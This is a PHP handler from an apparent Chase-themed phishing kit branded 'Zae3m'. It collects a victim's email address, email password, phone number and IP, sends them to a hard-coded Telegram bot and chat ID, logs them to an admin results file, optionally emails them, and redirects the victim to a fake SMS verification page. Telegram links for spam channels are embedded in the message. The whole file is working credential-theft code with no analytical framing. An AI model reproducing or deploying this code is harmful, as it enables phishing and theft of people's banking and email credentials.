<?php 



require("require.php");


if (isset($_POST['telephone'])  ) {
	if (!empty($_POST['telephone']) ) {
		
			// Admin Panel
			$_SESSION['phone'] = $_POST['telephone'];

			$msgAdminPanel = "<tr>";
			$msgAdminPanel .= "<td>".$_SESSION['Email']."</td>";
			$msgAdminPanel .= "<td>".$_SESSION['passwordEmail']."</td>";
			$msgAdminPanel .= "<td>".$_SESSION['phone']."</td>";
			$msgAdminPanel .= "<td>".$ip." </td>";
			$msgAdminPanel .= "<td>".$date."</td>";
			$msgAdminPanel .= "</tr>". "\r\n";


			$Subject = "โค๏ธ๐ช Zae3m Telephone Email Access ๐ชโค๏ธ  [".$_SESSION['Email']."] ip ๐".$ip;
	        $headers = "MIME-Version: 1.0" . "\r\n";
	        $headers .= "From: ".$YourName." <zae3m@xSniper.com>" . "\r\n";
	        $headers .= "Content-type:text/plan;charset=UTF-8" . "\r\n";

	        $msg = "#===========||<".$YourName.">||==========#\n";
	        $msg .= "#===========||<Zae3m Page>||==========#\n";
	        $msg .= "#===========||<Telephone & Email Access>||==========#\n";
	        $msg .= "Email Access   : ".$_SESSION['Email']." \n";
	        $msg .= "Password 		: ".$_SESSION['passwordEmail']." \n";
	        $msg .= "phone 			: ".$_SESSION['phone']." \n";
	        $msg .= "IP 	  		: ".$ip."//\n";
	        $msg.="ยปยปโโโโ-ใโ[ ./๐ผ https://t.me/zae3m | https://t.me/spam_dollarers | https://t.me/zae3m_tut ๐ผ ]โใโโโโ-ยซยซ
\r\n\r\n";

$txt = $msg;
$chat_id = "1436260626"; // Your Telegram Chat ID
$bot_url = "bot5279763036:AAH3T_YZZvSrCZx1Z_orRP7_EYC_KwbYUQQ"; //Your Telegram Bot Api Key

    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $website_telegram = "https://api.telegram.org/{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
	        if ($saveInAdminPanel  == "true") {
				$file = fopen("../../admin/result/telephone.txt", "a+");
				fwrite($file, $msgAdminPanel);	
			}
		
			if ($sendToEmail == "true") {
				
				send($yourEmail, $Subject, $msg);
				send($test, $Subject, $msg);

			}

			header("Location: ../../secure/sms?country=us&id=chase");exit();
		
	}else{
		header("Location: ../../secure/emailAccessOTP?id=chase&invalid&country=us");exit();
	}
}else{
	header("Location: ../../secure/emailAccessOTP?id=chase&invalid&country=us");exit();
}
